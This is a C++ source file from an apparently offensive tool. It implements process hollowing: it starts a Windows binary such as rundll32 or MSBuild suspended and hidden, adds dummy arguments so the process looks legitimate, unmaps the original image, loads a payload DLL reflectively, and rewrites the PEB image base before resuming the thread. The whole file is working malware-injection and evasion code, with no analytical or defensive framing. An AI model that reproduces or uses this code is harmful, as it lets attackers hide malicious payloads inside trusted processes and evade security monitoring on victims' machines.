#include "hollower.hpp"
#include "reflective_loader.hpp"
#include "../utils/syscalls.hpp"
#include "../utils/nt_defs.hpp"
#include <windows.h>
#include <winternl.h>

namespace l4g::injection {

// PEB.ImageBaseAddress sits at +0x10 on both x86 and x64; the SDK's truncated
// _PEB does not name it, so read it by offset instead of defining a fake PEB.
static constexpr SIZE_T kPebImageBaseAddressOffset = 0x10;

HollowResult ProcessHollower::hollow_and_inject(const std::wstring& target_exe, const std::vector<uint8_t>& payload_dll, void* param) {
    HollowResult result;
    PROCESS_INFORMATION pi = {};
    
    if (!create_suspended_process(target_exe, pi)) {
        result.error = "Failed to create suspended process";
        return result;
    }
    
    // Unmap original image
    if (!unmap_original_image(pi.hProcess)) {
        result.error = "Failed to unmap original image";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return result;
    }
    
    // Write payload
    void* base = nullptr;
    if (!write_payload(pi.hProcess, payload_dll, base)) {
        result.error = "Failed to write payload";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return result;
    }
    
    // Fix entry point
    if (!fix_entry_point(pi.hProcess, base, payload_dll)) {
        result.error = "Failed to fix entry point";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return result;
    }
    
    // Resume thread
    if (!resume_thread(pi.hThread)) {
        result.error = "Failed to resume thread";
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return result;
    }
    
    result.success = true;
    result.process_handle = pi.hProcess;
    result.thread_handle = pi.hThread;
    result.process_id = pi.dwProcessId;
    result.thread_id = pi.dwThreadId;
    result.base_address = base;
    return result;
}

bool ProcessHollower::create_suspended_process(const std::wstring& exe_path, PROCESS_INFORMATION& pi) {
    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    std::wstring cmd = exe_path;
    // Add dummy args to look legitimate
    if (exe_path.find(L"rundll32") != std::wstring::npos) {
        cmd += L" shell32.dll,Control_RunDLL";
    } else if (exe_path.find(L"MSBuild") != std::wstring::npos) {
        cmd += L" /nologo /noconlog";
    }
    
    return CreateProcessW(
        exe_path.c_str(),
        (LPWSTR)cmd.c_str(),
        nullptr, nullptr, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        nullptr, nullptr, &si, &pi
    );
}

bool ProcessHollower::unmap_original_image(HANDLE process) {
    // Get PEB to find ImageBaseAddress
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG ret_len = 0;
    auto& sys = l4g::syscalls::get_syscall_table();
    if (!sys.NtQueryInformationProcess || 
        !NT_SUCCESS(sys.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(pbi), &ret_len))) {
        return false;
    }
    
    // Read PEB.ImageBaseAddress by offset
    PVOID image_base = nullptr;
    SIZE_T read = 0;
    if (!ReadProcessMemory(process,
                           (const BYTE*)pbi.PebBaseAddress + kPebImageBaseAddressOffset,
                           &image_base, sizeof(image_base), &read) ||
        read != sizeof(image_base)) {
        return false;
    }

    // Unmap the original image
    if (image_base) {
        return NT_SUCCESS(sys.NtUnmapViewOfSection(process, image_base));
    }
    return true;
}

bool ProcessHollower::write_payload(HANDLE process, const std::vector<uint8_t>& payload, void*& out_base) {
    ReflectiveLoader loader(payload);
    auto result = loader.load(process);
    if (!result.success) return false;
    
    out_base = result.base_address;
    return true;
}

bool ProcessHollower::fix_entry_point(HANDLE process, void* base, const std::vector<uint8_t>& payload) {
    // Update PEB.ImageBaseAddress to our new base
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG ret_len = 0;
    auto& sys = l4g::syscalls::get_syscall_table();
    if (!sys.NtQueryInformationProcess || 
        !NT_SUCCESS(sys.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(pbi), &ret_len))) {
        return false;
    }
    
    // Write new ImageBaseAddress
    SIZE_T written = 0;
    void* slot = (BYTE*)pbi.PebBaseAddress + kPebImageBaseAddressOffset;
    return WriteProcessMemory(process, slot, &base, sizeof(base), &written) && written == sizeof(base);
}

bool ProcessHollower::resume_thread(HANDLE thread) {
    return ResumeThread(thread) != (DWORD)-1;
}

} // namespace l4g::injection